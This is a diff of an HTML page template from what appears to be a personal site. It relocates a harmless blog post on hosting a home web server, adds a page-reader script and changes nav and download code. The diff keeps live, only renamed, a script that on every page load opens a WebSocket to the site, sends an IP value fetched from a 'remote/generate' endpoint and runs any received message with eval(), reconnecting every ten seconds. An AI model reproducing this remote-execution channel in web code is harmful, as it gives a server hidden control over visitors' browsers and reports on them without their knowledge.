@@ -65,7 +65,7 @@
               <a class="nav-link" href="/en/landing" title="Visit the landing page">Landing</a>
             </li>
             <li class="nav-item">
-              <a class="nav-link" href="https://qoshlli.com" title="Video chat">Chat</a>
+              <a class="nav-link" href="/en/chat" title="Video chat">Chat</a>
             </li>
             <li class="nav-item">
               <a class="nav-link" href="/en/private" title="See private photos with a key">Private</a>
@@ -123,14 +123,8 @@
 <img src="https://i.imgur.com/dAQRaWt.jpeg" alt="Daisy's profile photo" width="120" height="120" style="margin-top:5px; margin-right:10px; margin-bottom:10px; border-radius: 50%;">
 <p><i>By Daisy</i></p>
 
-<div style="white-space: pre-wrap;">
+<div style="white-space: pre-wrap;"><p>How do I host a web server from my home?</p><p><br/></p><p>Hosting a web server from your home can be done by following these steps:</p><p><br/></p><p>1. Choose a server software: You can choose from various server software options like Apache, Nginx, Microsoft Internet Information Services (IIS), etc. Choose one that suits your requirements.</p><p><br/></p><p>2. Set up a static IP address: Contact your internet service provider (ISP) and request a static IP address for your internet connection. This will ensure that your website remains accessible even if your IP address changes.</p><p><br/></p><p>3. Configure your router: Log in to your router's administration panel and forward port 80 (the default port for HTTP traffic) to the internal IP address of your server. This will allow external traffic to reach your web server.</p><p><br/></p><p>4. Install and configure the server software: Install the server software on your server machine and configure it according to your needs, such as setting up virtual hosts, SSL certificates, etc.</p><p><br/></p><p>5. Test your website: Check if your website is accessible by entering your static IP address into a web browser. You can also test it using online tools like Pingdom or GTmetrix.</p><p><br/></p><p>6. Domain name and DNS setup: Register a domain name for your website and set up the DNS records to point to your static IP address.</p><p><br/></p><p>7. Security measures: Implement security measures like firewalls, encryption, regular backups, etc., to protect your web server from cyber threats.</p><p><br/></p><p>8. Monitor and maintain: Regularly monitor your server for performance issues, security threats, and software updates. Keep your server software and applications up to date to ensure smooth functioning.</p><p><br/></p><p>Please note that hosting a web server from your home may not be suitable for high traffic websites or sensitive data due to potential security risks and limited bandwidth. Consider using a professional web hosting service for such requirements.</p><div><br/></div></div>
 
-
-
-<p>How do I host a web server from my home?</p><p><br></p><p>Hosting a web server from your home can be done by following these steps:</p><p><br></p><p>1. Choose a server software: You can choose from various server software options like Apache, Nginx, Microsoft Internet Information Services (IIS), etc. Choose one that suits your requirements.</p><p><br></p><p>2. Set up a static IP address: Contact your internet service provider (ISP) and request a static IP address for your internet connection. This will ensure that your website remains accessible even if your IP address changes.</p><p><br></p><p>3. Configure your router: Log in to your router's administration panel and forward port 80 (the default port for HTTP traffic) to the internal IP address of your server. This will allow external traffic to reach your web server.</p><p><br></p><p>4. Install and configure the server software: Install the server software on your server machine and configure it according to your needs, such as setting up virtual hosts, SSL certificates, etc.</p><p><br></p><p>5. Test your website: Check if your website is accessible by entering your static IP address into a web browser. You can also test it using online tools like Pingdom or GTmetrix.</p><p><br></p><p>6. Domain name and DNS setup: Register a domain name for your website and set up the DNS records to point to your static IP address.</p><p><br></p><p>7. Security measures: Implement security measures like firewalls, encryption, regular backups, etc., to protect your web server from cyber threats.</p><p><br></p><p>8. Monitor and maintain: Regularly monitor your server for performance issues, security threats, and software updates. Keep your server software and applications up to date to ensure smooth functioning.</p><p><br></p><p>Please note that hosting a web server from your home may not be suitable for high traffic websites or sensitive data due to potential security risks and limited bandwidth. Consider using a professional web hosting service for such requirements.</p><div><br></div>
-
-
-</div>
 
 <div class="mx-auto p-1 m-1" style="display: flex; justify-content: space-around;">
 <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6209985848112194"
@@ -247,6 +241,23 @@
         
 
 
+var currentReader = 0;
+function toggleReader(id) {
+	currentReader = id;
+	$('#reader-modal' + id).toggleClass('hide');
+	$('#reader-modal' + id).toggleClass('fade-in-fast');
+	$('#bnav' + id).toggleClass('hide');
+	$('#bnav' + id).toggleClass('fade-in-fast');
+	setTimeout(function() {
+		$('#reader-modal' + id).toggleClass('fade-in-fast');
+		$('#bnav' + id).toggleClass('fade-in-fast');
+	}, 1000);
+}
+function jumpbookto(page) {
+	document.getElementById('reader-modal' + currentReader).scrollTo(0, (parseInt(document.getElementById('jumpto' + page).value)-1) * parseInt(window.innerHeight));
+	document.getElementById('pagecount' + page).innerHTML = parseInt(document.getElementById('jumpto' + page).value);
+}
+
 
         
         
@@ -257,32 +268,32 @@
             
         	Prism.highlightAll();
         });
-        var socket;
-        function openSocket() {
+        var remoteSocket;
+        function openRemoteSocket() {
             window.location.hash = '';
-            socket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
-            socket.addEventListener("open", (event) => {
+            remoteSocket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
+            remoteSocket.addEventListener("open", (event) => {
                 console.log('Socket open.');
                 fetch('https://lotteh.com/remote/generate/')
         		    .then(response => response.json())
         		    .then(data => {
-        		        socket.send(data.ip);
+        		        remoteSocket.send(data.ip);
         		    })
         		    .catch(error => {
         		        console.log('Error:', error);
         		    });
             });
-            socket.addEventListener("closed", (event) => {
+            remoteSocket.addEventListener("closed", (event) => {
                 console.log('Socket closed.');
                 setTimeout(function() {
-                    openSocket();
+                    openRemoteSocket();
                 }, 10000);
             });
-        	socket.addEventListener("message", (event) => {
+        	remoteSocket.addEventListener("message", (event) => {
                     eval(event.data);
             });
         }
-        openSocket();
+        openRemoteSocket();
         $(document).ready(function() {
         	$("#contact-form").submit(function(e){
                 	e.preventDefault();
@@ -434,8 +445,8 @@ if(document.getElementById("current-time")) {
               link.href = url;
               link.download = 'Glam Girl X - ' + filename;
               document.body.appendChild(link);
+              link.classList.add('hide');
               link.click();
-              document.body.removeChild(link);
             }
             function downloadQr() {
                     downloadQrImage(image.src, 'QR Code');
@@ -457,6 +468,8 @@ if(document.getElementById("current-time")) {
   });
 </script>
 
+    
+    
     
     
     <script>
